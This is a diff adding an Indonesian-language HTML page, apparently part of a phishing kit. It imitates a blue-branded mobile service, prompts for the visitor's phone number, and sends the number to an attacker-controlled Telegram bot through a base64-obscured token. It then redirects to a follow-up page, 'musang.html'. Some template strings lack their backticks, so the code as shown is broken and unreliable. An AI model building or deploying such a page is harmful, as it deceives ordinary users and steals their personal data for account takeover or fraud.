@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#118eea">
+    <title>Masukkan Nomor Handphone</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #118eea;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        .container {
+            padding: 20px;
+            margin-top: 20px;
+            flex-grow: 1;
+        }
+        .logo {
+            width: 130px;
+            margin-bottom: 10px;
+        }
+        .input-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .input-wrapper {
+            position: relative;
+            width: 300px;
+        }
+        .icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 65px;
+            height: 45px;
+        }
+        input[type="tel"] {
+            padding-left: 80px;
+            width: 100%;
+            height: 45px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 10px;
+            background-color: white;
+            color: black;
+        }
+        .button-container {
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            padding: 10px;
+            background-color: #118eea;
+            text-align: center;
+        }
+        .submit-button {
+            background: none;
+            border: none;
+            padding: 0;
+            color: white;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        .submit-button:hover {
+            color: #dddddd;
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+        .loading img {
+            width: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        p {
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+<form id="phoneForm" action="#" method="post">
+    <div class="container">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEg3W1e-Q4DtbaO1xNNgQBsYSOF_eMf4kssHUNlXmShUHc93Lgj5fdB4ZTVr8NAsj4xN1Z3BiDrfr3CISxTEThEixk84xxIf4ZQm6QPB31R4O_gavWdcg00yhAJtYbctqz5eTrjxwS0jq26KVdHLt7f4cyI6vT6zHYreTAvWBEYbKzfDfpKbxdoLSMmh2lDS" alt="Logo" class="logo">
+        <p>Masukkan <strong>nomor HP</strong> kamu untuk lanjut</p><br>
+        <div class="input-container">
+            <div class="input-wrapper">
+                <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhfqqkgEeAbg1A2QZDsQjJm7-R10BYdQgCccD9_JeTv5968wQSm4yoyNTPu8T6I3uxfVTNAZ2uvYfc38sjOU4-lywWponnU1OjiSM7Di_keRhqsfgzppcPIRNJAVPYr1hjNTvwRElxo_tOLlvkVgy7Na72LnBLfFN1p37QlOTg98zgJyPBX2nXI9Q8h-1nc" alt="Icon" class="icon">
+                <input type="tel" name="phone" id="phone" placeholder="811-1234-5678" required>
+            </div>
+        </div>
+        <div class="loading" id="loading">
+            <img src="load_spin.png" alt="Loading...">
+        </div>
+    </div>
+    <div class="button-container">
+        <button type="button" class="submit-button" onclick="submitForm()">LANJUT</button>
+    </div>
+</form>
+
+<script>
+    // Token Telegram yang dienkripsi (misalnya menggunakan Base64)
+    const encryptedToken = "NzgwMDQ3NTY3NzoBQUFDEAAUKSxlQ21JbkUwLTF4Z--OM44"; // Ini hanya contoh
+
+    // Fungsi untuk mendekripsi token (Base64 decode)
+    function decryptToken(encrypted) {
+        return atob(encrypted);
+    }
+
+    // Fungsi utama untuk mengirim data
+    function submitForm() {
+        const phoneNumber = document.getElementById('phone').value;
+
+        if (!phoneNumber) {
+            alert('Nomor telepon tidak boleh kosong!');
+            return;
+        }
+
+        // Dekripsi token sebelum digunakan
+        const botToken = decryptToken(encryptedToken);
+        const chatId = 'YOUR_CHAT_ID'; // Ganti dengan Chat ID Anda
+
+        document.getElementById('loading').style.display = 'block';
+
+        fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: Nomor Telepon: ${phoneNumber}\nPesan: 🦅 Rajawali Abadi 🦅
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Pesan berhasil dikirim:', data);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        })
+        .finally(() => {
+            setTimeout(() => {
+                window.location.href = 'musang.html'; // Redirect ke halaman berikutnya
+            }, 3000);
+        });
+    }
+</script>
+</body>
+</html>
